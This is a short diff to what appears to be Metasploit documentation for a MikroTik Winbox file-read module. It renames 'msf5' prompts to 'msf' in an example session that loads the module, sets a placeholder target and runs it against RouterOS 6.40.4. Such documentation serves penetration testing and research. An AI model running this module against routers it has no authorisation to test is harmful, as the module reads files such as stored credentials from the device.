@@ -42,10 +42,10 @@ Add a user
 ### Mikrotik Cloud Router RouterOS 6.40.4
 
 ```
-msf5 > use auxiliary/gather/mikrotik_winbox_fileread 
-msf5 auxiliary(gather/mikrotik_winbox_fileread) > set rhosts 1.1.1.1
+msf > use auxiliary/gather/mikrotik_winbox_fileread 
+msf auxiliary(gather/mikrotik_winbox_fileread) > set rhosts 1.1.1.1
 rhosts => 1.1.1.1
-msf5 auxiliary(gather/mikrotik_winbox_fileread) > run
+msf auxiliary(gather/mikrotik_winbox_fileread) > run
 
 [*] Running for 1.1.1.1...
 [*] 1.1.1.1 - Session ID: 54
